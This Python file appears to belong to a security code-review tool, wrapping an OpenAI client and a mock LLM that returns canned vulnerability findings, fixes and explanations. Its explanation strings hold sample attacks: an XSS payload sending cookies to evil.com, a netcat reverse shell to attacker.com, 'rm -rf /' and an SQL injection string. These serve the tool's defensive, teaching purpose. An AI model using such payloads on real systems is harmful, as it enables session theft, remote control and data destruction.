"""
LLM client wrapper for OpenAI (or compatible) models.

Provides a unified interface for making LLM calls with structured output parsing.
"""

from __future__ import annotations

import json
import logging
import os
from typing import Union, List

from dotenv import load_dotenv

load_dotenv()

logger = logging.getLogger(__name__)


def get_llm_client():
    """
    Returns a configured LLM client.
    Uses OpenAI if API key is available, otherwise falls back to a mock.
    """
    api_key = os.getenv("OPENAI_API_KEY", "")

    if api_key and api_key != "your-openai-api-key-here":
        try:
            from langchain_openai import ChatOpenAI

            model = os.getenv("OPENAI_MODEL", "gpt-4o-mini")
            temperature = float(os.getenv("OPENAI_TEMPERATURE", "0.1"))

            logger.info(f"Using OpenAI model: {model}")
            return ChatOpenAI(
                model=model,
                temperature=temperature,
                api_key=api_key,
            )
        except ImportError:
            logger.warning("langchain-openai not installed, falling back to mock LLM")
    else:
        logger.info("No OpenAI API key configured, using mock LLM")

    return MockLLM()


class MockLLM:
    """
    Mock LLM that returns pre-defined security analysis responses.
    Used when no OpenAI API key is configured (MVP/demo mode).

    The routing is designed to work correctly through the full LangGraph pipeline:
      1. Code Analyzer sends a prompt with "CODE CHANGES" header
      2. Security Agent sends a prompt with "OWASP REFERENCE" header
      3. Fix Generator sends a prompt with "SECURITY FINDINGS" header and mentions "fix"
      4. Explanation Agent sends a prompt with "FIX SUGGESTIONS" header and mentions "explain"
      5. Reviewer sends a prompt that is the final consolidation
    """

    def invoke(self, prompt: Union[str, list]) -> MockResponse:
        """Simulate an LLM call and return a structured mock response."""
        prompt_str = str(prompt) if not isinstance(prompt, str) else prompt

        # Route based on unique prompt markers (order matters for specificity)
        if "final security review gatekeeper" in prompt_str.lower():
            return MockResponse(self._reviewer_response(prompt_str))
        elif "security educator" in prompt_str.lower() or "FIX SUGGESTIONS:" in prompt_str:
            return MockResponse(self._explanation_response(prompt_str))
        elif "concrete, actionable fix" in prompt_str.lower() or "SECURITY FINDINGS:" in prompt_str:
            return MockResponse(self._fix_suggestion_response(prompt_str))
        elif "OWASP REFERENCE" in prompt_str or "cybersecurity expert" in prompt_str.lower():
            return MockResponse(self._security_agent_response(prompt_str))
        elif "CODE CHANGES:" in prompt_str or "code security analyst" in prompt_str.lower():
            return MockResponse(self._code_analyzer_response(prompt_str))
        else:
            return MockResponse(self._generic_response())

    def _code_analyzer_response(self, prompt: str) -> str:
        """Mock response for the Code Analyzer Agent — returns initial findings."""
        findings = []
        if "SELECT" in prompt or "query" in prompt:
            findings.append({
                "file": "UserService.java",
                "vulnerability": "SQL Injection",
                "severity": "HIGH",
                "description": "User input directly concatenated into SQL query",
                "line_context": "String query = \"SELECT * FROM users WHERE name = '\" + name + \"'\";",
            })
        if "API_KEY" in prompt or "password" in prompt or "secret" in prompt:
            findings.append({
                "file": "config.py",
                "vulnerability": "Hardcoded Secret",
                "severity": "CRITICAL",
                "description": "Sensitive credential hardcoded in source code",
                "line_context": "API_KEY = \"sk-proj-abc123\"",
            })
        if "innerHTML" in prompt or "userInput" in prompt:
            findings.append({
                "file": "app.js",
                "vulnerability": "Cross-Site Scripting (XSS)",
                "severity": "HIGH",
                "description": "User input rendered in HTML without sanitization",
                "line_context": "element.innerHTML = userInput;",
            })
        if "os.system" in prompt or "subprocess" in prompt or "eval(" in prompt:
            findings.append({
                "file": "script.py",
                "vulnerability": "Command Injection",
                "severity": "CRITICAL",
                "description": "User input passed to OS command execution",
                "line_context": "os.system(\"grep \" + user_input + \" /var/log/app.log\")",
            })
        if "pickle" in prompt:
            findings.append({
                "file": "utils.py",
                "vulnerability": "Insecure Deserialization",
                "severity": "HIGH",
                "description": "Deserializing untrusted data may lead to RCE",
                "line_context": "data = pickle.loads(untrusted_bytes)",
            })
        if not findings:
            findings.append({
                "file": "unknown",
                "vulnerability": "Potential Security Issue",
                "severity": "MEDIUM",
                "description": "Code requires manual security review",
                "line_context": "",
            })
        return json.dumps(findings)

    def _security_agent_response(self, prompt: str) -> str:
        """Mock response for the Security Agent — maps findings to OWASP."""
        # Parse the analysis results from the prompt to maintain pipeline context
        findings = []
        if "SQL Injection" in prompt:
            findings.append({
                "file": "UserService.java",
                "vulnerability": "SQL Injection",
                "severity": "HIGH",
                "owasp": "A03:2021 Injection",
                "issue": "User input directly concatenated into SQL query allows attackers to modify query logic",
                "confidence": "HIGH",
            })
        if "Hardcoded Secret" in prompt:
            findings.append({
                "file": "config.py",
                "vulnerability": "Hardcoded Secret",
                "severity": "CRITICAL",
                "owasp": "A02:2021 Cryptographic Failures",
                "issue": "API key hardcoded in source code — exposed in version control",
                "confidence": "HIGH",
            })
        if "XSS" in prompt or "Cross-Site Scripting" in prompt:
            findings.append({
                "file": "app.js",
                "vulnerability": "Cross-Site Scripting (XSS)",
                "severity": "HIGH",
                "owasp": "A03:2021 Injection",
                "issue": "User input rendered via innerHTML without sanitization enables script injection",
                "confidence": "HIGH",
            })
        if "Command Injection" in prompt:
            findings.append({
                "file": "script.py",
                "vulnerability": "Command Injection",
                "severity": "CRITICAL",
                "owasp": "A03:2021 Injection",
                "issue": "User input passed to os.system allows arbitrary OS command execution",
                "confidence": "HIGH",
            })
        if "Insecure Deserialization" in prompt:
            findings.append({
                "file": "utils.py",
                "vulnerability": "Insecure Deserialization",
                "severity": "HIGH",
                "owasp": "A08:2021 Software and Data Integrity Failures",
                "issue": "pickle.loads on untrusted data enables remote code execution",
                "confidence": "HIGH",
            })
        if not findings:
            findings.append({
                "file": "unknown",
                "vulnerability": "Potential Security Issue",
                "severity": "MEDIUM",
                "owasp": "A04:2021 Insecure Design",
                "issue": "Code requires manual security review",
                "confidence": "MEDIUM",
            })
        return json.dumps(findings)

    def _fix_suggestion_response(self, prompt: str) -> str:
        """Mock response for the Fix Generator Agent."""
        fixes = []
        if "SQL Injection" in prompt:
            fixes.append({
                "file": "UserService.java",
                "vulnerability": "SQL Injection",
                "fix": "Use PreparedStatement with parameterized queries instead of string concatenation",
                "code_fix": "PreparedStatement stmt = conn.prepareStatement(\"SELECT * FROM users WHERE name = ?\"); stmt.setString(1, name);",
                "best_practice": "Never concatenate user input into SQL queries; always use parameterized queries or an ORM",
            })
        if "Hardcoded Secret" in prompt:
            fixes.append({
                "file": "config.py",
                "vulnerability": "Hardcoded Secret",
                "fix": "Move credentials to environment variables or a secrets manager like AWS Secrets Manager or HashiCorp Vault",
                "code_fix": "API_KEY = os.environ.get('API_KEY')",
                "best_practice": "Store all secrets in environment variables or dedicated secrets management systems",
            })
        if "XSS" in prompt or "Cross-Site Scripting" in prompt:
            fixes.append({
                "file": "app.js",
                "vulnerability": "Cross-Site Scripting (XSS)",
                "fix": "Use textContent instead of innerHTML, or sanitize with DOMPurify",
                "code_fix": "element.textContent = userInput;",
                "best_practice": "Always encode/escape output based on context (HTML, JS, URL) and implement Content-Security-Policy headers",
            })
        if "Command Injection" in prompt:
            fixes.append({
                "file": "script.py",
                "vulnerability": "Command Injection",
                "fix": "Use subprocess with shell=False and a list of arguments instead of os.system",
                "code_fix": "result = subprocess.run(['grep', user_input, '/var/log/app.log'], shell=False, capture_output=True)",
                "best_practice": "Never pass user input to shell commands; use parameterized APIs",
            })
        if "Insecure Deserialization" in prompt:
            fixes.append({
                "file": "utils.py",
                "vulnerability": "Insecure Deserialization",
                "fix": "Use safe serialization formats like JSON instead of pickle for untrusted data",
                "code_fix": "data = json.loads(untrusted_string)",
                "best_practice": "Never deserialize untrusted data with pickle, yaml.load, or ObjectInputStream",
            })
        if not fixes:
            fixes.append({
                "file": "unknown",
                "vulnerability": "Potential Security Issue",
                "fix": "Review and apply secure coding practices per OWASP guidelines",
                "code_fix": None,
                "best_practice": "Follow OWASP Top 10 guidelines for secure coding",
            })
        return json.dumps(fixes)

    def _explanation_response(self, prompt: str) -> str:
        """Mock response for the Explanation Agent."""
        explanations = []
        if "SQL Injection" in prompt:
            explanations.append({
                "file": "UserService.java",
                "vulnerability": "SQL Injection",
                "explanation": "SQL injection allows attackers to manipulate database queries by inserting malicious SQL code through user input. When input is directly concatenated into SQL strings, attackers can bypass authentication, read sensitive data, or destroy the database.",
                "attack_scenario": "An attacker enters `' OR '1'='1` as the username, causing the query to return all users and bypassing authentication.",
                "impact": "Data breach, unauthorized access, data deletion, and potential full system compromise.",
            })
        if "Hardcoded Secret" in prompt:
            explanations.append({
                "file": "config.py",
                "vulnerability": "Hardcoded Secret",
                "explanation": "Hardcoded credentials in source code are exposed to anyone with repository access. Once discovered, these credentials provide unauthorized access to external services and APIs.",
                "attack_scenario": "A leaked API key in a public or compromised repository allows attackers to access cloud services at the organization's expense.",
                "impact": "Unauthorized access, data breaches, financial loss from abused API quotas, and regulatory compliance violations.",
            })
        if "XSS" in prompt or "Cross-Site Scripting" in prompt:
            explanations.append({
                "file": "app.js",
                "vulnerability": "Cross-Site Scripting (XSS)",
                "explanation": "XSS allows attackers to inject malicious scripts into web pages viewed by other users. The browser executes the injected script as trusted code, enabling session hijacking and data theft.",
                "attack_scenario": "An attacker inserts `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` to steal session tokens.",
                "impact": "Session hijacking, credential theft, defacement, and malware distribution.",
            })
        if "Command Injection" in prompt:
            explanations.append({
                "file": "script.py",
                "vulnerability": "Command Injection",
                "explanation": "Command injection allows attackers to execute arbitrary OS commands on the server by injecting shell metacharacters into user inputs passed to system calls.",
                "attack_scenario": "An attacker inputs `; rm -rf /` or `| nc attacker.com 4444 -e /bin/sh` to get a reverse shell on the server.",
                "impact": "Complete server compromise, data exfiltration, lateral movement within the network.",
            })
        if "Insecure Deserialization" in prompt:
            explanations.append({
                "file": "utils.py",
                "vulnerability": "Insecure Deserialization",
                "explanation": "Insecure deserialization occurs when untrusted data is used to reconstruct objects. Attackers craft malicious serialized payloads that execute arbitrary code during deserialization.",
                "attack_scenario": "An attacker sends a crafted pickle payload that executes `os.system('reverse_shell')` when deserialized by the application.",
                "impact": "Remote code execution, server compromise, denial of service.",
            })
        if not explanations:
            explanations.append({
                "file": "unknown",
                "vulnerability": "Potential Security Issue",
                "explanation": "This code pattern may introduce security vulnerabilities. Review the implementation against secure coding guidelines.",
                "attack_scenario": "Various attack vectors may be possible depending on the specific implementation.",
                "impact": "Potential security breach, data exposure, or service disruption.",
            })
        return json.dumps(explanations)

    def _reviewer_response(self, prompt: str) -> str:
        """Mock response for the Final Reviewer Agent — consolidates all findings."""
        # Build final review by parsing findings from the prompt
        final = []
        if "SQL Injection" in prompt:
            final.append({
                "file": "UserService.java",
                "line_number": 4,
                "vulnerability": "SQL Injection",
                "severity": "HIGH",
                "issue": "User input directly concatenated into SQL query allows attackers to modify query logic",
                "fix": "Use PreparedStatement with parameterized queries instead of string concatenation",
                "explanation": "SQL injection allows attackers to manipulate database queries by inserting malicious SQL code through user input.",
                "owasp": "A03:2021 Injection",
            })
        if "Hardcoded Secret" in prompt:
            final.append({
                "file": "config.py",
                "line_number": 3,
                "vulnerability": "Hardcoded Secret",
                "severity": "CRITICAL",
                "issue": "API key hardcoded in source code — exposed in version control",
                "fix": "Move credentials to environment variables or a secrets manager",
                "explanation": "Hardcoded credentials in source code are exposed to anyone with repository access.",
                "owasp": "A02:2021 Cryptographic Failures",
            })
        if "XSS" in prompt or "Cross-Site Scripting" in prompt:
            final.append({
                "file": "app.js",
                "line_number": 7,
                "vulnerability": "Cross-Site Scripting (XSS)",
                "severity": "HIGH",
                "issue": "User input rendered via innerHTML without sanitization enables script injection",
                "fix": "Use textContent instead of innerHTML, or sanitize with DOMPurify",
                "explanation": "XSS allows attackers to inject malicious scripts into web pages viewed by other users.",
                "owasp": "A03:2021 Injection",
            })
        if "Command Injection" in prompt:
            final.append({
                "file": "script.py",
                "line_number": 5,
                "vulnerability": "Command Injection",
                "severity": "CRITICAL",
                "issue": "User input passed to os.system allows arbitrary OS command execution",
                "fix": "Use subprocess with shell=False and a list of arguments",
                "explanation": "Command injection allows attackers to execute arbitrary OS commands on the server.",
                "owasp": "A03:2021 Injection",
            })
        if "Insecure Deserialization" in prompt:
            final.append({
                "file": "utils.py",
                "line_number": 10,
                "vulnerability": "Insecure Deserialization",
                "severity": "HIGH",
                "issue": "pickle.loads on untrusted data enables remote code execution",
                "fix": "Use safe serialization formats like JSON instead of pickle",
                "explanation": "Insecure deserialization occurs when untrusted data is used to reconstruct objects.",
                "owasp": "A08:2021 Software and Data Integrity Failures",
            })
        if not final:
            final.append({
                "file": "unknown",
                "line_number": None,
                "vulnerability": "Potential Security Issue",
                "severity": "MEDIUM",
                "issue": "Code requires manual security review",
                "fix": "Review and apply secure coding practices",
                "explanation": "This code pattern may introduce security vulnerabilities.",
                "owasp": "A04:2021 Insecure Design",
            })
        return json.dumps(final)

    def _generic_response(self) -> str:
        return json.dumps({"message": "Analysis complete"})


class MockResponse:
    """Wraps a string to mimic LangChain AIMessage interface."""

    def __init__(self, content: str):
        self.content = content

    def __str__(self):
        return self.content
